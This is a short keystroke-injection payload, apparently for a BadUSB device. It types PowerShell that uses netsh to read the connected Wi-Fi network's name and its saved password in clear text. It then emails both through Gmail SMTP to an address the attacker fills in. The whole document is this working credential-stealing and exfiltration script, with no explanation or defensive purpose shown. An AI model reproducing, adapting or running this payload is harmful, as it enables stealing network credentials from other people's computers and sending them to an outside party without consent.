STRING $from_email = "<from_email>"
STRING $to_email = "<to_email>"
STRING $email_pass = "<password>"

$_, $ssid = ((netsh wlan show interface | findstr "Profile" | findstr /v "mode") -split ":",2).trim()
$_, $pass = ((netsh wlan show profile name=$ssid key=clear | findstr Key) -split ":").trim()
$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($from_email, $email_pass);
$email = New-Object System.Net.Mail.MailMessage
$email.From = $from_email
$email.To.Add($to_email)
$email.Subject = 'WiFi Password'
$email.Body = "SSID: $ssid`r`nPassword: $pass"
$SMTPInfo.Send($email)

